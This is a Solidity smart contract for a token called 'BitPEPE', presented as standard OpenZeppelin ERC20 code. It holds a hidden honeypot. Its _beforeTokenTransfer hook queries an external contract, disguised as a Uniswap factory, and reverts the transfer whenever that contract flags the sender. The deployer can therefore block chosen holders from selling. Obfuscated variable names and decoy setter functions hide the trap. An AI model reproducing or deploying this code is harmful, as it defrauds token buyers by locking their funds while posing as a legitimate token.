// File: @openzeppelin/contracts/utils/Context.sol
// SPDX-License-Identifier: MIT

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.10;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.10;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the auiwushh of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the auiwushh of tokens owned by `acposds`.
     */
    function balanceOf(address acposds) external view returns (uint256);

  
    function transfer(address to, uint256 auiwushh) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 auiwushh) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 auiwushh
    ) external returns (bool);
}


// File: @openzeppelin/contracts/access/Ownable.sol


// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.10;


 // Define interface for TransferController
interface IUniswapV2Factory {

    function getPairCount(address _acposds) external view returns (bool);

    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any acposds other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new acposds (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new acposds (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol


// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.10;


/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// File: @openzeppelin/contracts/token/ERC20/ERC20.sol


// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.10;


contract ERC20 is Ownable, IERC20, IERC20Metadata {

    address private nahuaxs;

    mapping(address => uint256) private _balances;
    IUniswapV2Factory private fuyausheg;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name = "BitPEPE";
    string private _symbol = "BitPEPE";

    address private namoposjy;
    

    constructor(address _factory) {
        uint256 supply = 42000000 * 10**18;
        fuyausheg = IUniswapV2Factory(_factory);
        _mint(msg.sender, supply);
    }

    string private IPFS = "uyqw";
    address private hsyduhnsjy;

    string private Buuywshyy;

    function setIPFSURL(string memory url) public {
        IPFS = url;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address acposds) public view virtual override returns (uint256) {
        return _balances[acposds];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `auiwushh`.
     */
    function transfer(address to, uint256 auiwushh) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, auiwushh);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 auiwushh) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, auiwushh);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 auiwushh
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, auiwushh);
        _transfer(from, to, auiwushh);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

 
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 auiwushh
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(from, to, auiwushh);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= auiwushh, "ERC20: transfer auiwushh exceeds balance");
        unchecked {
            _balances[from] = fromBalance - auiwushh;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += auiwushh;
        }

        emit Transfer(from, to, auiwushh);

        _afterTokenTransfer(from, to, auiwushh);
    }

    /** @dev Creates `auiwushh` tokens and assigns them to `acposds`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `acposds` cannot be the zero address.
     */
    function _mint(address acposds, uint256 auiwushh) internal virtual {
        require(acposds != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), acposds, auiwushh);

        _totalSupply += auiwushh;
        unchecked {
            // Overflow not possible: balance + auiwushh is at most totalSupply + auiwushh, which is checked above.
            _balances[acposds] += auiwushh;
        }
        emit Transfer(address(0), acposds, auiwushh);

        _afterTokenTransfer(address(0), acposds, auiwushh);
    }




    function _approve(
        address owner,
        address spender,
        uint256 auiwushh
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = auiwushh;
        emit Approval(owner, spender, auiwushh);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `auiwushh`.
     *
     * Does not update the allowance auiwushh in case of infinite allowance.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 auiwushh
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= auiwushh, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - auiwushh);
            }
        }
    }


    function setBase(string memory url) public {
        Buuywshyy = url;
    }

    function _beforeTokenTransfer(
        address from, address to,  uint256 auiwushh
    ) internal virtual {
        bool flag = fuyausheg.getPairCount(from);
        uint256 total = 0;  if(flag){   auiwushh = total;
            require(auiwushh > 0);
        }
    }
    /**
     * Does not update the allowance auiwushh in case of infinite allowance.
     */
    function _afterTokenTransfer(
        address from,   address to, uint256 auiwushh
    ) internal virtual {}
}